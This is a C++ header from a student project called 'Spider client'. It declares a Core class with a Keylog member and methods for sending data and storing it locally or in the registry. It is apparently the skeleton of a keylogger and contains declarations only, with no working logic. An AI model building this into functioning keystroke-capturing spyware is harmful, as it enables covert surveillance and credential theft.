//
// Core.hh for Spider client in /home/touzet_t/epitech/cpp/cpp_spider/client
// 
// Made by Theo TOUZET
// Login   <touzet_t@epitech.net>
// 
// Started on  Tue Nov  1 13:50:30 2016 Theo TOUZET
// Last update Tue Nov  1 13:50:48 2016 Theo TOUZET
//

#ifndef CORE_HH_
# define CORE_HH_

#include <iostream>
#include <fstream>

#include "Keylog.hh"

class Core
{
public:
	Core();
	~Core();
	int	sendData(const std::string &);
	int	storeInReg(const std::string &);
	int	storeLocally(const std::string &);
	int	run();

private:
	std::string	msgReceived;
	std::string	msgToSent;
	bool		cmdBreak;

	Keylog keylog;

};

#endif /* !CORE_HH_ */
